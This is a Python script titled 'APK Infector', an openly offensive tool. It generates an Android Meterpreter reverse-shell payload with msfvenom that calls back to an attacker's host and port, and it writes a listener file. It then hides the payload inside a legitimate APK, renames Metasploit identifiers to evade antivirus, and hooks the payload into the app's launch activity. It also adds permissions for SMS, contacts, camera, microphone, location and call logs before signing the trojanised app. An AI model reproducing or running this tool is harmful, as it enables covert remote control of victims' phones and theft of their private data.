#!/usr/bin/python3

import os
import subprocess
import argparse
import random
import banner
import shutil

pwd = os.getcwd()

BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

def get_arguments():
    banner.banner1()
    parser = argparse.ArgumentParser(description=f'{RED}APK Infector v1.0')
    parser._optionals.title = f"{GREEN}Optional Arguments{YELLOW}"
      
    required_arguments = parser.add_argument_group(f'{RED}Required Arguments{GREEN}')
    required_arguments.add_argument("--lhost", dest="lhost", help="Attacker's IP Address", required=True)
    required_arguments.add_argument("--lport", dest="lport", help="Attacker's Port", required=True)
    required_arguments.add_argument("-n", "--normal-apk", dest="normal_apk", help="Absolute Path of Legitimate APK File", required=True)
    required_arguments.add_argument("--apk-name", dest="apkName", help="Absolute Path of Legitimate APK File", required=True)
    
    return parser.parse_args()

def check_dependencies_and_updates():
    print(f"{YELLOW}\n[*] Checking for Dependencies \n{WHITE}================================\n\n[:] NOTE : {GREEN}Jarsigner{WHITE} or {GREEN}APKsigner{WHITE} is used to Sign APK, One of them must be installed on your System")
    print(f"{YELLOW}\n[*] Checking : APKTool")
    apktool = os.system("which apktool > /dev/null")
    if apktool == 0:
        print(f"{GREEN}[+] APKTool - OK")
    else:
        print(f"{RED}[!] APKTool - 404 NOT FOUND !")
        apktool_install = input(f"{BLUE}\n[?] What to Install It Now ? (y/n) : ")
        if apktool_install.lower() == "y":
            os.system("apt-get update")
            os.system("apt-get install apktool")
                    
    print(f"{YELLOW}\n[*] Checking : Jarsigner")
    jarsigner = os.system("which jarsigner > /dev/null")
    if jarsigner == 0:
        print(f"{GREEN}[+] Jarsigner - OK")
    else:
        print(f"{RED}[!] Jarsigner - 404 NOT FOUND !")
        jarsigner_install = input(f"{BLUE}\n[?] What to Install It Now ? (y/n) : {WHITE}")
        if jarsigner_install.lower() == "y":
            os.system("apt-get update")
            os.system("apt-get install openjdk-11-jdk")
            print(f"{WHITE}\n[:] Please Select Latest Java Version ")
            os.system("update-alternatives --config java")

    print(f"{YELLOW}\n[*] Checking : APKsigner")
    apksigner = os.system("which apksigner > /dev/null")
    if apksigner == 0:
        print(f"{GREEN}[+] APKsigner - OK")
    else:
        print(f"{RED}[!] APKsigner - 404 NOT FOUND !")
        jarsigner_install = input(f"{BLUE}\n[?] What to Install It Now ? (y/n) : {WHITE}")
        if jarsigner_install.lower() == "y":
            os.system("apt-get update")
            os.system("apt-get install apksigner")
       
    print(f"{YELLOW}\n[*] Checking : ZipAlign")
    zipalign = os.system("which zipalign > /dev/null")
    if zipalign == 0:
        print(f"{GREEN}[+] ZipAlign - OK")
    else:
        print(f"{RED}[!] ZipAlign- 404 NOT FOUND !")
        jarsigner_install = input(f"{BLUE}\n[?] What to Install It Now ? (y/n) : {WHITE}")
        if jarsigner_install.lower() == "y":
            os.system("apt-get update")
            os.system("apt-get install zipalign")

def ask_for_payload_type():
    print(WHITE,""" 
    ====================================    
    [*] Available Types of Payload
    ====================================
    (1) android/meterpreter/reverse_tcp
    (2) android/meterpreter/reverse_http    
    (3) android/meterpreter/reverse_https    
    """)
    choice = int(input(f"{BLUE}[?] Which Type of Payload, You Want to Create (1/2/3): "))
    return choice

def generate_meterpreter_payload(lhost, lport):
    payload_type = ask_for_payload_type()
    if payload_type == 1:
        type_of_payload = "android/meterpreter/reverse_tcp" 
    elif payload_type == 2:
        type_of_payload = "android/meterpreter/reverse_http"
    elif payload_type == 3:
        type_of_payload = "android/meterpreter/reverse_https"       
   
    print(f"{YELLOW}\n[*] Creating Android Payload Using msfvenom")
    os.system(f"msfvenom -p {type_of_payload} LHOST={lhost} LPORT={lport} > android_payload.apk") 
    if os.path.exists("android_payload.apk"):
        print(f"{GREEN}[+] Payload Created Successfully !")
    
    choice_handler = input(f"\n{BLUE}[?] Want to Create msfconsole handler.rc file (y/n): ")
    if choice_handler.lower() == 'y':
        print(f"{YELLOW}\n[*] Creating handler.rc")
        if os.path.exists("handler.rc"):
            os.system("rm handler.rc")
        handler=open("handler.rc","w")
        handler.write("use exploit/multi/handler\n")
        handler.write(f"set {type_of_payload}\n")
        handler.write(f"set LHOST {lhost}\n")
        handler.write(f"set LPORT {lport}\n")
        handler.write("exploit -j")
        handler.close()
        print(f"{GREEN}[+] Created Successfully : {pwd}/handler.rc")

def decompile_evil_and_normal_apk():
    print(f"{YELLOW}\n[*] Decompiling Normal/Legitimate APK\n=============================================")
    
    try:
        shutil.rmtree(f"{pwd}/normal_apk")
    except Exception:
        pass
        
    decompile_normal_apk = os.system(f"apktool d {arguments.normal_apk} -o {pwd}/normal_apk")
    if decompile_normal_apk == 0:
        print(f"{GREEN}[+] Decompiled Successfully !")
    else:
        print(f"{RED}[!] Failed to Decompile Normal/Legitimate APK")
        
    print(f"{YELLOW}\n[*] Decompiling Android Payload\n=============================================")
    decompile_evil_apk = os.system(f"apktool d {pwd}/android_payload.apk -o {pwd}/android_payload")
    if decompile_normal_apk == 0:
        print(f"{GREEN}[+] Decompiled Successfully !")
    else:
        print(f"{RED}[!] Failed to Decompile Evil APK")

def change_file_and_folder_name_of_payload(VAR1, VAR2, VAR3, VAR4, VAR5, VAR6, VAR7, VAR8, apkName):
    print(f"{YELLOW}\n[*] Changing default folder and filenames being flagged by AV")
    # Changing the default folder and filenames
    os.system(f"mv {pwd}/android_payload/smali/com/metasploit {pwd}/android_payload/smali/com/{VAR1}")
    os.system(f"mv {pwd}/android_payload/smali/com/{VAR1}/stage {pwd}/android_payload/smali/com/{VAR1}/{VAR2}")
    os.system(f"mv {pwd}/android_payload/smali/com/{VAR1}/{VAR2}/Payload.smali {pwd}/android_payload/smali/com/{VAR1}/{VAR2}/{VAR3}.smali")

    # Updating paths in .smali files 
    os.system(f"sed -i \"s#/metasploit/stage#/{VAR1}/{VAR2}#g\" {pwd}/android_payload/smali/com/{VAR1}/{VAR2}/*")
    os.system(f"sed -i \"s#Payload#{VAR3}#g\" {pwd}/android_payload/smali/com/{VAR1}/{VAR2}/*")

    # Flagged by AV, changed to something not as obvious
    os.system(f"sed -i \"s#com.metasploit.meterpreter.AndroidMeterpreter#com.{VAR4}.{VAR5}.{VAR6}#\" {pwd}/android_payload/smali/com/{VAR1}/{VAR2}/{VAR3}.smali")
    os.system(f"sed -i \"s#payload#{VAR7}#g\" {pwd}/android_payload/smali/com/{VAR1}/{VAR2}/{VAR3}.smali")
    os.system(f"sed -i \"s#com.metasploit.stage#com.{VAR1}.{VAR2}#\" {pwd}/android_payload/AndroidManifest.xml")
    os.system(f"sed -i \"s#metasploit#{VAR8}#\" {pwd}/android_payload/AndroidManifest.xml")
    os.system(f"sed -i \"s#MainActivity#{apkName}#\" {pwd}/android_payload/res/values/strings.xml")
    print(f"{GREEN}[+] Changed Successfully!")

def move_payload_files_to_normal_apk(VAR1):
    print(f"{YELLOW}\n[*] Moving Meterpreter Payload to Normal/Legitimate APK")
    moving_payload = os.system(f"mv {pwd}/android_payload/smali/com/{VAR1} {pwd}/normal_apk/smali/com/")
    os.system(f"rm -rf {pwd}/android_payload")
    if moving_payload == 0:
        print(f"{GREEN}[+] Moved Successfully!")
    else:
        print(f"{RED}[!] Failed to Move Evil Files to Normal/Legitimate APK")    

def hook_meterpreter_in_apk(VAR1, VAR2, VAR3):
    print(f"{YELLOW}\n[*] Trying to Find .smali File of Launcher")
    lineNumber = subprocess.check_output(f"grep -n -A 1 android.intent.action.MAIN {pwd}/normal_apk/AndroidManifest.xml | grep android.intent.category.LAUNCHER | cut -d- -f1", shell=True)
    lineNumber = int(lineNumber) - 1
    i = 1
    launcherActivity = ""
    while i<lineNumber:
        launcherActivity = subprocess.check_output("sed -n '"+ str(lineNumber) +" p' "+pwd+"/normal_apk/AndroidManifest.xml | grep android:label=\\\"@string/app_name\\\" | grep android:name=\\\" | grep -o -P '(?<=android:name=\").*(?=\")' | awk 'NR==1{print $1}' | cut -d '\"' -f1", shell=True)
        if len(launcherActivity) > 0:
            launcherActivity = str(launcherActivity.strip()).split('\'')[1]
            break
        lineNumber = lineNumber - 1
    if launcherActivity == "":
        print(f"{RED}[!] Unable to locate the .smali launcher in AndroidManifest.xml")
        print(f"{WHITE}[:] Example input of launcher string : {YELLOW}zl.com.river_iq.RiverIQ")
        launcherActivity = input(f"{BLUE}[?] Please Enter LAUNCHER/MAIN Function Manually from normal_apk/AndroidManifest.xml: ")
    print(f"{GREEN}[+] Finded .smali launcher : {launcherActivity}")
    launcherActivity = launcherActivity.replace('.', '/')  # Ex:- Changing zl.com.river_iq.RiverIQ  TO zl/com/river_iq/RiverIQ
    launcherActivity = "normal_apk/smali/" + launcherActivity + ".smali"         # Ex:- Changing zl/com/river_iq/RiverIQ  TO zl/com/river_iq/RiverIQ.smali
    print(f"{GREEN}[+] Path of MAIN/LAUNCHER .smali file: {WHITE}{launcherActivity}")
    print(f"{YELLOW}[*] Hooking meterpreter payload")
    # Hooking invoke Method In .smali of Launcher
    os.system("sed -i \"/method.*onCreate(/ainvoke-static {p0}, Lcom/"+VAR1+"/"+VAR2+"/"+VAR3+";->start(Landroid/content/Context;)V\" "+pwd+"/"+launcherActivity+"")
    print(f"{GREEN}[+] Hooked Successfully!")
    
def inject_meterpreter_permission():
    print(f"{YELLOW}\n[*] Injecting meterpreter payload's Permission")

    permission_01 = f'sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\\"android.permission.SET_WALLPAPER\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
    permission_02 = f'sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\\"android.permission.INTERNET\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
    permission_03 = f'sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\\"android.permission.ACCESS_WIFI_STATE\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
    permission_04 = f'sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\\"android.permission.CHANGE_WIFI_STATE\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
    permission_05 = f'sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\\"android.permission.ACCESS_NETWORK_STATE\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
    permission_06 = f'sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\\"android.permission.ACCESS_COARSE_LOCATION\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
    permission_07 = f'sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\\"android.permission.ACCESS_FINE_LOCATION\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
    permission_08 = f'sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\\"android.permission.READ_PHONE_STATE\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
    permission_09 = f'sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\\"android.permission.SEND_SMS\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
    permission_10 = f'sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\\"android.permission.RECEIVE_SMS\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
    permission_11 = f'sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\\"android.permission.RECORD_AUDIO\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
    permission_12 = f'sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\\"android.permission.CALL_PHONE\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
    permission_13 = f'sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\\"android.permission.READ_CONTACTS\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
    permission_14 = f'sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\\"android.permission.WRITE_CONTACTS\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
    permission_15 = f'sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\\"android.permission.RECORD_AUDIO\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
    permission_16 = f'sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\\"android.permission.WRITE_SETTINGS\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
    permission_17 = f'sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\\"android.permission.CAMERA\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
    permission_18 = f'sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\\"android.permission.READ_SMS\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
    permission_19 = f'sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\\"android.permission.WRITE_EXTERNAL_STORAGE\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
    permission_20 = f'sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\\"android.permission.RECEIVE_BOOT_COMPLETED\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
    permission_21 = f'sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\\"android.permission.READ_CALL_LOG\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
    permission_22 = f'sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\\"android.permission.WRITE_CALL_LOG\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
    permission_23 = f'sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\\"android.permission.WAKE_LOCK\\"/>" {pwd}/normal_apk/AndroidManifest.xml'

    permissions_list = [permission_01, permission_02, permission_03, permission_04, permission_05, permission_06, permission_07, permission_08, permission_09, permission_10, permission_11, permission_12, permission_13, permission_14, permission_15, permission_16, permission_17, permission_18, permission_19, permission_20, permission_21, permission_22, permission_23]
    
    random.shuffle(permissions_list)  # Shuffling Permission List
    for i in range(len(permissions_list)): 
        os.system(permissions_list[i])

    user_permission_1 = f'sed -i "/SET_WALLPAPER/a \    <uses-feature android:name=\\"android.hardware.camera\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
    user_permission_2 = f'sed -i "/SET_WALLPAPER/a \    <uses-feature android:name=\\"android.hardware.camera.autofocus\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
    user_permission_3 = f'sed -i "/SET_WALLPAPER/a \    <uses-feature android:name=\\"android.hardware.microphone\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
     
    user_permission_list = [user_permission_1, user_permission_2, user_permission_3]

    random.shuffle(user_permission_list)  # Shuffling USER Permission List
    for i in range(len(user_permission_list)): 
        os.system(user_permission_list[i])
        
    print(f"{GREEN}[+] Injected Successfully!")

def remove_duplicates_from_AndroidManifest():
    print(f"{YELLOW}\n[*] Removing Duplicates from AndroidManifest.xml")
    lines_seen = set() # holds lines already seen
    outfile = open(f"{pwd}/normal_apk/AndroidManifest_New.xml", "w")
    for line in open(f"{pwd}/normal_apk/AndroidManifest.xml", "r"):
        if line not in lines_seen: # not a duplicate
            outfile.write(line)
            lines_seen.add(line)
    outfile.close()
    os.system(f"rm -r {pwd}/normal_apk/AndroidManifest.xml")
    os.system(f"mv {pwd}/normal_apk/AndroidManifest_New.xml {pwd}/normal_apk/AndroidManifest.xml")
    print(f"{GREEN}[+] Removed Duplicate Entries from AndroidManifest.xml Successfully!")   

def compile_infected_apk():
    print(f"{YELLOW}\n[*] Compiling Infected APK\n=================================")
    os.system(f"apktool b {pwd}/normal_apk -o {pwd}/injected.apk")
    print(f"{GREEN}[+] Compiled Successfully!")
    
def sign_apk():
    try:
        os.system("rm -rf ~/.android")
        os.system("mkdir ~/.android")
    except Exception:
        pass
        
    print(f"{YELLOW}\n[*] Generating Key to Sign APK ")
    keytool = os.system("keytool -genkey -v -keystore ~/.android/debug.keystore -storepass android -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 -validity 10000")
    if keytool == 0:
        print(f"{GREEN}[+] Key Generated Successfully!")
        
    choice_to_sign_apk = input(f"{BLUE}\n[?] Want to Use {GREEN}(J)arsigner {BLUE}or {GREEN}(A)PKsigner {BLUE} for Signing APK (j/a): ")
    if choice_to_sign_apk.lower() == "j":    
        print(f"{YELLOW}\n[*] Trying to Sign APK Using Jarsigner")
        os.system(f"jarsigner -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA {pwd}/injected.apk androiddebugkey")    
        print(f"{GREEN}[+] Signed the .apk file using {WHITE} ~/.android/debug.keystore")
    elif choice_to_sign_apk.lower() == "a":    
        print(f"{YELLOW}\n[*] Trying to Sign APK Using APKsigner")
        os.system(f"apksigner sign --ks ~/.android/debug.keystore --ks-pass pass:android --in {pwd}/injected.apk")    
        print(f"{GREEN}[+] Signed the .apk file using {WHITE} ~/.android/debug.keystore")

def zipalign_apk():
    print(f"{YELLOW}\n[*] ZipAligning Signed APK\n{WHITE}=================================={YELLOW}")
    zipalign_apk = os.system(f"zipalign -v 4 {pwd}/injected.apk {pwd}/signed.apk")
    if zipalign_apk == 0:
        print(f"{GREEN}[+] ZipAligned APK Successfully!")

def housekeeping():
    os.system(f"mv {pwd}/signed.apk {pwd}/Final_Infected.apk")
    os.system(f"rm -rf {pwd}/normal_apk {pwd}/android_payload.apk {pwd}/injected.apk")
    print(f"{GREEN}[+] Output : {WHITE} {pwd}/Final_Infected.apk")
    print("\n\n")
    banner.banner2()
    print(f"{GREEN}\n\n !!!! HAPPY HUNTING !!!!")
    
if __name__ == '__main__':
    arguments = get_arguments()  
    print(f"{YELLOW}\n[*] Generating Random Variables which will be used in Ofustication")
    VAR1 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True) # smali dir renaming
    VAR1 = str(VAR1.strip()).split('\'')[1]
    VAR2 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True) # smali dir renaming
    VAR2 = str(VAR2.strip()).split('\'')[1]
    VAR3 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True) # Payload.smali renaming
    VAR3 = str(VAR3.strip()).split('\'')[1]
    VAR4 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True) # Pakage name renaming 1 
    VAR4 = str(VAR4.strip()).split('\'')[1]
    VAR5 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True) # Pakage name renaming 2
    VAR5 = str(VAR5.strip()).split('\'')[1]
    VAR6 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True) # Pakage name renaming 3
    VAR6 = str(VAR6.strip()).split('\'')[1]
    VAR7 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True) # New name for word 'payload'
    VAR7 = str(VAR7.strip()).split('\'')[1]
    VAR8 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True) # New name for word 'metasploit'
    VAR8 = str(VAR8.strip()).split('\'')[1]
    apkName = arguments.apkName
    print(f"{GREEN}[+] Generated Successfully!")
    
    check_dependencies_and_updates()
    generate_meterpreter_payload(arguments.lhost, arguments.lport)
    decompile_evil_and_normal_apk()
    change_file_and_folder_name_of_payload(VAR1, VAR2, VAR3, VAR4, VAR5, VAR6, VAR7, VAR8, apkName)
    move_payload_files_to_normal_apk(VAR1)
    hook_meterpreter_in_apk(VAR1, VAR2, VAR3)
    inject_meterpreter_permission()
    remove_duplicates_from_AndroidManifest()
    compile_infected_apk()
    sign_apk()
    zipalign_apk()
    housekeeping()
    
    
